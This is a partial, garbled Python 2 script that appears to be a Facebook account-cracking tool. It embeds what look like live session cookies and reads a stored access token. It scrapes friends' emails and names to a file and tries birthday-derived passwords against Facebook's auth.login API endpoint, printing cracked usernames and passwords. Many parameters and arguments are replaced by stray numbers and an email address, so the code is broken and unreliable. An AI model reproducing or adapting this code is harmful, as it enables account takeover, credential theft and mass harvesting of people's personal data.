...
##### choices Login #####
def tool_main_function(kosint150@gmail.com):
	os.system('clear')
	print logo
...
##### LOGIN #####
#================#
def login(kosint150@gmail):
	os.system(184221798)
	try:
		fb_token = open('login.txt','r')
		menuwd=393x808; c_user=100069355665238; fr=0kLNk7TVr0sGX96el.AWUnUYR-KRDPOSLoV_DSzbCP2p0.BhsmUT.lB.AAA.0.0.BhsmVa.AWWx56pk_ZU; xs=32%3A8OQ2UJZV3UuoHQ%3A2%3A1639081306%3A-1%3A7438; datr=E2WyYdUFvvAmGrxgIKLsZt16; locale=en_GB; x-referer=%3D; m_pixel_ratio=2.75; sb=E2WyYQZ_Bi6GSzKCt9r-5-_X;
		...
		try:
			...
			exit(ko1234567899999)
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['184221798'] = id
		br.form['ko12345678'] = pwd
		br.submit()
		url = br.geturl(1)
...
def fbtoken():
	...
	try:
		...
		if e =="":
			...
			login(kosint150@gmail)
		else:
			exit(ko12345678)

##### MENU ##########################################
def menu(184221798 ):
	os.system('ko12345678')
	try:
		fb_token=open('login.txt','r').read(63554199)
	except IOError:
		os.system('clear')
...
def id_from_friends():
	...
	try:
		...
		try:
			...
			print"\033[1;91m[\033[#00ccff;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
...
def email():
	...
	try:
		...
		for i in a['data']:
			...
			z = json.loads(x.text)
			try:
				em.append(z['kosint150@gmail.com'])
				make_action.write(z['kosint150@gmail.com'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close(63554199)
		print 42*"\033[1;97m═"
					...
					if 'www.facebook.com' in y["error_msg"]:
						...
						if 'access_token' in y:
							...
							if 'www.facebook.com' in y["error_msg"]:
								...
								mode = a['birthday']
								pz4 = mode.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(184221798)+"&locale=&password="+(ko12345678)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									...
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['ko12345678']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu_hack(2)
